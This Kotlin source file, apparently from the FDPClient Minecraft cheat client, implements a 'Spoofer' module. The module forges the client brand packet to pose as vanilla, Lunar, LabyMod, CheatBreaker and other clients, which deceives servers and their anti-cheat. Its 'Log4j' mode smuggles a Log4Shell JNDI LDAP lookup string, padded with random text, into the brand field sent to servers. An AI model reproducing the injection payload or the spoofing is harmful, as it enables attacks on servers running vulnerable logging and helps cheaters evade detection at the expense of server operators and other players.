/*
 * FDPClient Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge by LiquidBounce.
 * https://github.com/SkidderMC/FDPClient/
 */
package net.ccbluex.liquidbounce.features.module.modules.client

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.event.EventTarget
import net.ccbluex.liquidbounce.event.PacketEvent
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.features.module.modules.client.button.*
import net.ccbluex.liquidbounce.features.special.spoof.ClientSpoofHandler
import net.ccbluex.liquidbounce.utils.PacketUtils
import net.ccbluex.liquidbounce.utils.misc.RandomUtils
import net.ccbluex.liquidbounce.value.ListValue
import net.ccbluex.liquidbounce.value.TextValue
import net.minecraft.client.gui.GuiButton
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.C17PacketCustomPayload
import java.util.*

/**
 * The type Client spoof.
 */
@ModuleInfo(name = "Spoofer",  category = ModuleCategory.CLIENT, defaultOn = true, forceNoSound = true)
class ClientSpoof : Module() {
    /**
     * The Mode value.
     */
    val modeValue = object : ListValue(
        "Mode",
        arrayOf(
            "Vanilla",
            "OptiFine",
            "Fabric",
            "Lunar",
            "LabyMod",
            "CheatBreaker",
            "PvPLounge",
            "Geyser",
            "MineBuilders",
            "Feather",
            "Log4j",
            "Custom"
        ),
        "Vanilla"
    ) {
        override fun onPostChange(oldValue: String?, newValue: String?) {
            if (oldValue != newValue) {
                ClientSpoofHandler.checkIconAndTitle()
            }
        }
    }

    private val customValue = TextValue("Custom-Brand", "WTF").displayable { modeValue.get().equals("custom", true) }

    val buttonValue = ListValue(
        "Button",
        arrayOf(
            "Better",
            "Dark",
            "Light",
            "Rounded",
            "RGB",
            "RGBRounded",
            "Flat",
            "FLine",
            "Melon",
            "LiquidBounce",
            "Wolfram",
            "Rise",
            "Hyperium",
            "Badlion",
            "PVP",
            "Vanilla"
        ),
        "PVP"
    )

    fun getButtonRenderer(button: GuiButton?): AbstractButtonRenderer? {
        val lowerCaseButtonValue = buttonValue.get().lowercase(Locale.getDefault())
        return when (lowerCaseButtonValue) {
            "better" -> BetterButtonRenderer(button!!)
            "rounded" -> RoundedButtonRenderer(button!!)
            "fline" -> FLineButtonRenderer(button!!)
            "hyperium" -> HyperiumButtonRenderer(button!!)
            "rgb" -> RGBButtonRenderer(button!!)
            "badlion" -> BadlionTwoButtonRenderer(button!!)
            "rgbrounded" -> RGBRoundedButtonRenderer(button!!)
            "wolfram" -> WolframButtonRenderer(button!!)
            "pvp" -> PvPClientButtonRenderer(button!!)
            "liquidbounce" -> LiquidButtonRenderer(button!!)
            "light" -> LunarButtonRenderer(button!!)
            "melon" -> MelonButtonRenderer(button!!)
            "dark" -> BlackoutButtonRenderer(button!!)
            else -> null // vanilla or unknown
        }
    }

    @EventTarget
    fun onPacket(event: PacketEvent) {
        val packet = event.packet
        if (!mc.isIntegratedServerRunning) {
            if (packet is C17PacketCustomPayload) {
                if ((event.packet as C17PacketCustomPayload).channelName.equals("MC|Brand", ignoreCase = true)) {
                    when (modeValue.get()) {
                        "Vanilla" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("vanilla")
                            )
                        )

                        "OptiFine" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("optifine")
                            )
                        )

                        "Fabric" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("fabric")
                            )
                        )

                        "LabyMod" -> {
                            mc.netHandler.addToSendQueue(C17PacketCustomPayload("labymod3:main", getInfo()))
                            mc.netHandler.addToSendQueue(C17PacketCustomPayload("LMC", getInfo()))
                        }

                        "CheatBreaker" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("CB")
                            )
                        )

                        "PvPLounge" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("PLC18")
                            )
                        )

                        "Geyser" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("eyser")
                            )
                        )

                        "Lunar" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("lunarclient:v2.14.5-2411")
                            )
                        )

                        "MineBuilders" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("minebuilders8")
                            )
                        )

                        "Feather" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString("Feather Forge")
                            )
                        )

                        "Log4j" -> {
                            val str =
                                "\${jndi:ldap://192.168.${RandomUtils.nextInt(1, 253)}.${RandomUtils.nextInt(1, 253)}}"
                            PacketUtils.sendPacketNoEvent(
                                C17PacketCustomPayload(
                                    "MC|Brand",
                                    PacketBuffer(Unpooled.buffer()).writeString(
                                        "${RandomUtils.randomString(5)}$str${
                                            RandomUtils.randomString(
                                                5
                                            )
                                        }"
                                    )
                                )
                            )
                        }

                        "Custom" -> PacketUtils.sendPacketNoEvent(
                            C17PacketCustomPayload(
                                "MC|Brand",
                                PacketBuffer(Unpooled.buffer()).writeString(customValue.get())
                            )
                        )
                    }
                }
                event.cancelEvent()
            }
        }
    }

    private fun getInfo(): PacketBuffer {
        return PacketBuffer(Unpooled.buffer())
            .writeString("INFO")
            .writeString(
                "{  \n" +
                        "   \"version\": \"3.9.25\",\n" +
                        "   \"ccp\": {  \n" +
                        "      \"enabled\": true,\n" +
                        "      \"version\": 2\n" +
                        "   },\n" +
                        "   \"shadow\":{  \n" +
                        "      \"enabled\": true,\n" +
                        "      \"version\": 1\n" +
                        "   },\n" +
                        "   \"addons\": [  \n" +
                        "      {  \n" +
                        "         \"uuid\": \"null\",\n" +
                        "         \"name\": \"null\"\n" +
                        "      }\n" +
                        "   ],\n" +
                        "   \"mods\": [\n" +
                        "      {  \n" +
                        "         \"hash\":\"sha256:null\",\n" +
                        "         \"name\":\"null.jar\"\n" +
                        "      }\n" +
                        "   ]\n" +
                        "}"
            )
    }

    @Override
    override fun onEnable() {
        ClientSpoofHandler.checkIconAndTitle()
    }

    @Override
    override fun onDisable() {
        ClientSpoofHandler.checkIconAndTitle()
    }

}